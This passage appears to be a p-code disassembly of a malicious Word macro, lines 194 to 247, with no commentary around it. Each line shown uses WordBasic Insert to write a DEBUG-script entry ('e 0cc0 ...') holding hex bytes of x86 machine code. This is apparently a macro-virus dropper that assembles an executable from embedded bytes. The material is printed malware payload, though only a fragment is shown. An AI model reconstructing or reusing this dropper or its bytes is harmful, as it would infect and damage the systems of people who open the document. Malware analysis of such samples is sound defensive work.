' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #194:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0cc0 00 e8 32 00 00 00 ff a1 b6 1d 40 00 e8 27 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #195:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0cd0 00 ff a1 d5 1d 40 00 e8 1c 00 00 00 ff a1 f4 1d "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #196:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ce0 40 00 e8 11 00 00 00 ff a1 11 1e 40 00 e8 06 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #197:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0cf0 00 00 ff a1 2c 1e 40 00 b9 04 00 00 00 e8 5a ff "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #198:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d00 ff ff 55 e8 04 00 00 00 8b cd 5d c3 e8 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #199:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d10 00 5d 81 ed 11 16 40 00 c3 c7 85 38 1b 40 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #200:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d20 00 00 00 e8 4e 00 00 00 83 bd 38 1b 40 00 05 74 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #201:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d30 44 b8 58 19 40 00 03 c5 e8 8e fe ff ff 83 f8 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #202:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d40 74 33 b8 d8 18 40 00 03 c5 e8 9a fe ff ff 83 f8 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #203:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d50 00 74 22 b8 d8 18 40 00 03 c5 e8 7d fe ff ff 83 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #204:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d60 f8 00 74 11 e8 0d 00 00 00 b8 58 19 40 00 03 c5 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #205:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d70 e8 67 fe ff ff c3 55 b8 e8 19 40 00 03 c5 50 b8 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #206:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d80 2a 1b 40 00 03 c5 50 8b 85 63 1c 40 00 ff d0 5d "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #207:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d90 83 f8 ff 74 6d 89 85 26 1b 40 00 ba 14 1a 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #208:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0da0 03 d5 e8 4c fb ff ff 83 bd 34 1b 40 00 01 75 0f "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #209:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0db0 ff 85 38 1b 40 00 83 bd 38 1b 40 00 05 74 43 55 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #210:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0dc0 b8 e8 19 40 00 03 c5 50 ff b5 26 1b 40 00 8b 85 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #211:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0dd0 79 1c 40 00 ff d0 5d 83 f8 00 74 26 ba 14 1a 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #212:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0de0 00 03 d5 e8 0b fb ff ff 83 bd 34 1b 40 00 01 75 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #213:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0df0 ce ff 85 38 1b 40 00 83 bd 38 1b 40 00 05 74 02 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #214:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e00 eb bd c3 e8 f1 fd ff ff 66 83 bd de 19 40 00 01 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #215:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e10 0f 85 b9 01 00 00 b8 b8 1e 40 00 03 c5 e8 ea fd "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #216:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e20 ff ff 83 f8 00 0f 84 a4 01 00 00 89 85 d0 1e 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #217:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e30 00 b8 c3 1e 40 00 03 c5 e8 cf fd ff ff 83 f8 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #218:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e40 0f 84 89 01 00 00 89 85 d4 1e 40 00 ba dc 1e 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #219:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e50 00 03 d5 8b 85 d4 1e 40 00 e8 ba fd ff ff 83 f8 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #220:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e60 00 0f 84 68 01 00 00 89 85 1b 1f 40 00 ba ea 1e "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #221:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e70 40 00 03 d5 8b 85 d4 1e 40 00 e8 99 fd ff ff 83 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #222:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e80 f8 00 0f 84 47 01 00 00 89 85 1f 1f 40 00 ba f9 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #223:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e90 1e 40 00 03 d5 8b 85 d0 1e 40 00 e8 78 fd ff ff "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #224:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ea0 83 f8 00 0f 84 26 01 00 00 89 85 23 1f 40 00 ba "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #225:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0eb0 05 1f 40 00 03 d5 8b 85 d0 1e 40 00 e8 57 fd ff "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #226:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ec0 ff 83 f8 00 0f 84 05 01 00 00 89 85 27 1f 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #227:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ed0 6a 00 68 80 00 00 00 6a 02 6a 00 6a 01 68 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #228:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ee0 00 40 b8 73 1e 40 00 03 c5 50 8b 85 c9 1b 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #229:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ef0 ff d0 83 f8 ff 0f 84 d4 00 00 00 89 85 7c 1e 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #230:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f00 00 6a 00 b8 80 1e 40 00 03 c5 50 68 e6 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #231:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f10 b8 2b 1f 40 00 03 c5 50 ff b5 7c 1e 40 00 8b 85 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #232:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f20 db 1b 40 00 ff d0 ff b5 7c 1e 40 00 8b 85 4c 1c "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #233:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f30 40 00 ff d0 b8 4e 1e 40 00 03 c5 50 6a 02 6a 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #234:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f40 b8 38 1e 40 00 03 c5 50 68 01 00 00 80 8b 85 1b "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #235:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f50 1f 40 00 ff d0 6a 02 b8 52 1e 40 00 03 c5 50 6a "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #236:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f60 01 6a 00 b8 56 1e 40 00 03 c5 50 ff b5 4e 1e 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #237:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f70 00 8b 85 1f 1f 40 00 ff d0 6a 02 b8 54 1e 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #238:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f80 03 c5 50 6a 01 6a 00 b8 64 1e 40 00 03 c5 50 ff "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #239:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f90 b5 4e 1e 40 00 8b 85 1f 1f 40 00 ff d0 6a 00 b8 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #240:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0fa0 73 1e 40 00 03 c5 50 6a 00 6a 14 8b 85 27 1f 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #241:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0fb0 00 ff d0 6a 30 b8 ab 1e 40 00 03 c5 50 b8 84 1e "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #242:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0fc0 40 00 03 c5 50 6a 00 8b 85 23 1f 40 00 ff d0 c3 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #243:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0fd0 00 00 f7 bf 00 00 40 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #244:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0fe0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #245:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ff0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #246:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #247:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
